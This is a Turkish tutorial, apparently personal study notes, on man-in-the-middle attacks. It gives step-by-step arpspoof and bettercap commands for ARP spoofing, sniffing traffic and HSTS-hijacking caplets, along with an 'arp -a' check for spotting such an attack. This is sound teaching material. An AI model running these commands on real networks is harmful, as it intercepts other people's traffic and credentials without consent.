## 🕵️‍♂️ Man in the Middle Saldırısı Nedir?
- Normalde sunucu ve client arasındaki iletişim şu şekilde olur:
	- 🧑‍💻 Client bir web sitesine istek yapar, bu isteği router'a iletir.
	- 📡 Router isteği ilgili web sitesine iletir, yanıtı alır.
	- 📬 Yanıtı alan router bu yanıtı client'e iletir.
---
- 🧑‍💻 Bu saldırı ile hacker şunu amaçlar:
	- Client bir web sitesine istek yapar, bu isteği router'a iletir.
	- 🕶️ Hacker kendini router gibi göstererek isteği alır ve router'a iletir.
	- Router isteği ilgili web sitesine iletir ve yanıtı alır.
	- 📬 Yanıtı alan router client'e iletir.
	- 🕶️ Hacker kendini client gibi göstererek yanıtı alır ve client'e iletir.
---
- Yani 🧑‍💻 kullanıcıya karşı router, 📡 router'a karşı kullanıcı gibi davranır.  
  Router ve kullanıcının tam ortasına girer ve böylece tüm web trafiği hacker'ın elinden geçer.  
  Böylece bu bilgilerin içeriğini görüntüleyebilir. 🔍
---
- Bu kandırma işlemi **🧬 ARP spoofing** ile yapılır.
	- 🧾 **ARP**, IP ve MAC adreslerinin eşleşmesini sağlayan bir protokoldür.  
	  Router tüm cihazlara **ARP request** göndererek "Bu IP kimin?" diye sorar.  
	  IP'ye sahip olan cihaz, **ARP reply** ile MAC adresini router'a gönderir.
	- ⚠️ **ARP request** gerekmeksizin **ARP reply** gönderilebilmesi sayesinde router kandırılabilir. (gerekli bilgiler netdiscover veya nmap ile elde edilebilir) 
	  Bu işleme **🎭 ARP spoofing** denir.

---

## 🎭 Arpspoof Aracı ile ARP Spoofing Yapmak

- 🛠️ Öncelikle **IP Forward** özelliği açılmalıdır:
  ```bash
  echo 1 > /proc/sys/net/ipv4/ip_forward
  ```
  📌 Bu komut ile sistem, gelen veriyi bir başka cihaza yönlendirebilir hâle gelir (değeri `1` olarak ayarlanır).

---

- 🔁 **Router'ı kandırmak için:**
  ```bash
  arpspoof -i <interface> -t <target router ip> <target client ip>
  ```

- 🔁 **Client'ı kandırmak için:**
  ```bash
  arpspoof -i <interface> -t <target client ip> <target router ip>
  ```

- 🧪 Bu iki komut **iki ayrı terminal** üzerinden **eşzamanlı** olarak çalıştırılmalıdır.

---

- 🧾 Kontrol etmek için hedef Windows bilgisayarda şu komut çalıştırılabilir:
  ```bash
  arp -a
  ```
- 📋 **ARP etkileşimi yapılan cihazların IP ve MAC adresleri** listelenir.

- ⚠️ Eğer cihaz ARP spoofing saldırısı altındaysa, **iki farklı IP adresinde aynı MAC adresi** görülür.

---

## 🧠 Bettercap Aracı ile ARP Spoofing Yapmak

- 📌 **Bettercap**, ağ analizinden saldırı simülasyonlarına kadar birçok işlemi yapabilen güçlü bir araçtır.

- **Başlatmak için:**
  ```bash
  bettercap -iface <interface>
  ```

---

### 🔎 Genel Kullanım Bilgisi

- Mevcut modülleri ve komutları listelemek için:
  ```bash
  help
  ```

- Belirli bir modül hakkında detaylı bilgi almak için:
  ```bash
  help <modül adı>
  ```

---

### 🌐 Ağdaki Cihazları Keşfetme

1. **Ağda aktif cihazları keşfetmek için:**
   ```bash
   net.probe on
   ```

2. **Tüm tespit edilen cihazları tablo halinde listelemek için:**
   ```bash
   net.show
   ```

---

### 🎭 ARP Spoofing Yapılandırması

- **ARP Spoofing modülünü yapılandırmak için:**
  ```bash
  set arp.spoof.fullduplex true
  set arp.spoof.internal true
  set arp.spoof.target <hedef cihaz ip>
  ```

  > 💡 `help arpspoof` komutu ile bu modül hakkında daha fazla bilgi alınabilir.

- **Saldırıyı başlatmak için:**
  ```bash
  arp.spoof on
  ```

- **Ağ trafiğini dinlemek için:**
  ```bash
  net.sniff on
  ```

---

📝 **Not:** Bettercap’in modüler yapısı sayesinde sadece ARP Spoofing değil, DNS Spoofing, HTTPS bypass ve çok daha fazlası gerçekleştirilebilir. Ancak bu işlemler yalnızca izinli ortamlarda ve etik amaçlarla yapılmalıdır ⚠️.

---
## 🔐 HTTPS ve Caplet’ler

- ⚠️ **ARP Spoofing** ile ağ trafiği dinlenirken, kullanıcı bir **HTTP** sitesine kullanıcı adı, şifre gibi bilgiler gönderirse bu veriler **açık biçimde** görüntülenebilir.

- Ancak **HTTPS** ile şifrelenen sitelerde durum farklıdır; bu veriler doğrudan okunamaz.

---

### 🎭 HSTS Hijacking (Caplet ile)

- **Caplet**'ler aracılığıyla, HTTPS ile korunan sitelere erişim engellenmeye çalışılır.  
  Amaç, kullanıcı HTTPS yerine sahte bir `.corn` uzantılı (örnek: `facebook.corn`) **HTTP** siteye yönlendirilsin.

- Bu işlem için:
  - `/usr/share/bettercap/caplets/hstshijack.cap` dosyasının içeriği düzenlenerek, hedef alınan web siteleri eklenebilir.
  - İstenirse internette bulunan başka caplet dosyaları indirilerek `/usr/share/bettercap/caplets` dizinine yerleştirilebilir.

---

### 🚀 Bettercap Üzerinde Kullanım

- ARP spoofing işlemi sırasında aşağıdaki komutla **hstshijack** caplet'i çalıştırılır:
  ```bash
  hstshijack/hstshijack
  ```

---

### ⚠️ Not

- Bu saldırının **başarılı ve inandırıcı şekilde çalışması genellikle zordur**.
  - Günümüzde çoğu tarayıcı HSTS (HTTP Strict Transport Security) desteğine sahip olduğu için HTTPS dışı bağlantıları otomatik olarak engeller.
